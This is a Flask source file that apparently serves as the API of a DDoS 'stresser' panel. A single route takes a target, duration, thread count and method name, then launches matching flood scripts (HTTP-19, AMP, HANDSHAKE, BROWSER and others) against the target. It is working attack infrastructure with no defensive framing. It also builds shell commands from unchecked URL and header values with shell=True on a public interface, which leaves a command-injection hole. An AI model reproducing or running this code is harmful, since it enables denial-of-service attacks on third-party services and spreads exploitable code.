from flask import Flask,request

app = Flask(__name__)
import subprocess
import threading

def execute_command(command):subprocess.Popen(command, shell=True)

@app.route('/target=<TARGET>&time=<TIME>&threads=<THREAD>&methods=<METHODS>')
def req(TARGET, TIME, THREAD, METHODS):
    upper_methods = METHODS.upper()
    if upper_methods in ['HTTP-19', 'BROWSER', 'HANDSHAKE', 'AMP', 'MURD-OPT','MURD','RAPID-FAST']:
        ports_opt = request.headers.get('X-Port')
        if ports_opt is None: ports_opt = 80
        meth_opt = request.headers.get('X-Methods')
        if meth_opt is None:
            if upper_methods not in ['BROWSER', 'HANDSHAKE', 'AMP', 'MURD-OPT','MURD','RAPID-FAST']:meth_opt = 'POST'
            else:meth_opt = 'GET'
        protocols = request.headers.get('X-Protocols')
        if protocols is None:protocols = 'https'
        links = request.headers.get('X-Links')
        if links is None:links = '/'
        proxy = request.headers.get('X-Browser')
        com = ''
        folder = 'meth/'
        if upper_methods in ['HTTP-19']:
            com = f"python {folder}{upper_methods.replace('-','_')}.py {TARGET} {ports_opt} {THREAD} {TIME} {meth_opt}"
        elif upper_methods in ['AMP','HANDSHAKE']:
            com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {TIME} {meth_opt}"
        elif upper_methods == 'BROWSER':
            com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {TIME} {meth_opt} {proxy} command.txt"
        elif upper_methods in ['MURD-OPT','MURD','RAPID-FAST']:
            com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {meth_opt}"
        threading.Thread(target=execute_command,args=(com,)).start()
        return f'{METHODS} {THREAD}/{TIME}s HTTP={meth_opt} --> {TARGET}'
    else:return 'IDK'

app.run('0.0.0.0')